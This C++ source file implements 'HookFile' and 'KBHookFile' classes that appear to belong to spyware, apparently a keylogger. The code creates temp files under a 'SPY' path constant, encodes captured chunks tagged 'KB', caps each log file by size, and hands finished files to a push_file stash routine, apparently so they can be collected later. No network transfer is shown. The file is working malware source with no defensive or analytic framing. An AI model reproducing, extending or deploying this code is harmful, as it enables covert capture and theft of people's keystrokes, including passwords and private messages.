#include "hookfile.h"
#include "stash.h"

bool HookFile::writable() const
{
	return fileHandle != NULL && fileHandle->handle != NULL;
}

void HookFile::open()
{
	char * tempFilePath = new char[SPY_MAX_TEMPFILE_PATH];
	get_temp_file_path(tempFilePath);
	fileHandle = new HOOK_FILE_HANDLE(tempFilePath);
	LOG("hookfile >> open file '%s'", tempFilePath);
	delete[] tempFilePath;
	LOG("open file at '%s'", fileHandle->filePath);
}

void HookFile::close()
{
	SAFE_FREE(fileHandle);
	LOG("hookfile >> closed file");
}

HookFile::HookFile(const char * magic, ENCODE_PROC encode_proc)
{
	LOG("create hook file");
	this->encode_proc = encode_proc;
	open();
	if (writable())
		write(magic, 2);
}

HookFile::~HookFile()
{
	push_file(fileHandle->filePath);
	close();
}

bool HookFile::is_full() const
{
	return false;
}

void HookFile::write(const void * chunk, size_t n) const
{
	if (writable())
	{
		LOG("write %d element to hook file", n);
		byte * out = new byte[n];
		n = encode_proc((const byte *) chunk, out, n);
		fwrite(out, sizeof(byte), n, fileHandle->handle);
		delete[] out;
		fflush(fileHandle->handle);
	}
}

KBHookFile::KBHookFile() : HookFile("KB", get_encode_text)
{
}

bool KBHookFile::is_full() const
{
	return fileHandle->handle != NULL && ftell(fileHandle->handle) >= MAX_LENGTH;
}